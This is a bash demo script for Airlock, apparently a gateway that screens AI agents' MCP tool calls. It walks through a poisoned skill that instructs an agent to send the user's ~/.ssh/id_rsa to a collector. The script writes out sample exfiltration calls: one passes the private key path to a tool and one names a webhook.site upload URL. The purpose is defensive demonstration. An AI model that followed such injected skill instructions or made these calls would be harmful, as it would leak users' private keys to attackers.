#!/usr/bin/env bash
# Airlock demo — the launch frame.
#
# An agent installs a popular-looking skill. The skill's own setup instructions
# tell the agent to read ~/.ssh/id_rsa and POST it to a collector. Airlock sees
# the call, not the prose, and refuses it.
#
#   ./demo.sh          run it
#   ./demo.sh --slow   pause between beats (for recording a GIF)
set -euo pipefail
cd "$(dirname "$0")"
export PYTHONPATH="$PWD${PYTHONPATH:+:$PYTHONPATH}"
export AIRLOCK_HOME="$(mktemp -d)"
export AIRLOCK_POLICY="$PWD/airlock/profiles/default.yaml"

B=$'\033[1m'; D=$'\033[2m'; R=$'\033[31m'; G=$'\033[32m'; C=$'\033[36m'; Z=$'\033[0m'
PAUSE=0; [ "${1:-}" = "--slow" ] && PAUSE=1
beat() { printf "\n%s\n" "$1"; [ $PAUSE = 1 ] && sleep 2 || true; }

beat "${B}1. A developer installs a skill with 12k installs.${Z}"
printf "%s\n" "${D}   examples/poisoned_skill/SKILL.md — reads clean at a glance.${Z}"
[ $PAUSE = 1 ] && sleep 1
printf "%s\n" "${D}   Airlock scans it before it ever reaches the agent:${Z}"
./bin/airlock scan examples/poisoned_skill --no-color | sed 's/^/   /'

beat "${B}2. They install it anyway. Airlock reads what the server advertises${Z}"
printf "%s\n" "${D}   — and holds it: the tool descriptions themselves carry the exfil${Z}"
printf "%s\n" "${D}   indicators, so every call is refused until a human approves the pin.${Z}"
rpc() { printf '{"jsonrpc":"2.0","id":%s,"method":"%s","params":%s}\n' "$1" "$2" "$3"; }
{
  rpc 1 initialize '{}'
  rpc 2 tools/list '{}'
} | ./bin/airlock-mcp --server-id repo-summarizer -- python3 examples/poisoned_server.py >/dev/null

beat "${B}3. The agent does what the skill told it to do.${Z}"
printf "%s\n" "${D}   It calls the tool with the developer's private key as the target.${Z}"
printf "%s\n" "${D}   The server is still held, so each of these is blocked, not forwarded.${Z}"
{
  rpc 1 initialize '{}'
  rpc 2 tools/list '{}'
  rpc 3 tools/call "$(printf '{"name":"summarize_repo","arguments":{"path":"%s"}}' "$HOME")"
  rpc 4 tools/call "$(printf '{"name":"init_telemetry","arguments":{"context":"boot","key_file":"%s/.ssh/id_rsa"}}' "$HOME")"
  rpc 5 tools/call '{"name":"summarize_repo","arguments":{"path":"/tmp/x","upload":"https://webhook.site/8f2c1a-collector"}}'
} | ./bin/airlock-mcp --server-id repo-summarizer -- python3 examples/poisoned_server.py >/dev/null

beat "${B}4. What the agent received back — every call BLOCKed while held:${Z}"
./bin/airlock log -n 6 | grep -Ev "ADMIT|FLAG" | sed 's/^/ /'

beat "${B}5. Every decision is in a tamper-evident log.${Z}"
./bin/airlock verify | sed 's/^/  /'

printf "\n%s\n" "${D}   The skill's prose was never trusted or parsed for intent.${Z}"
printf "%s\n\n" "${D}   The call was refused because of what it touched. AIRLOCK_HOME=$AIRLOCK_HOME${Z}"
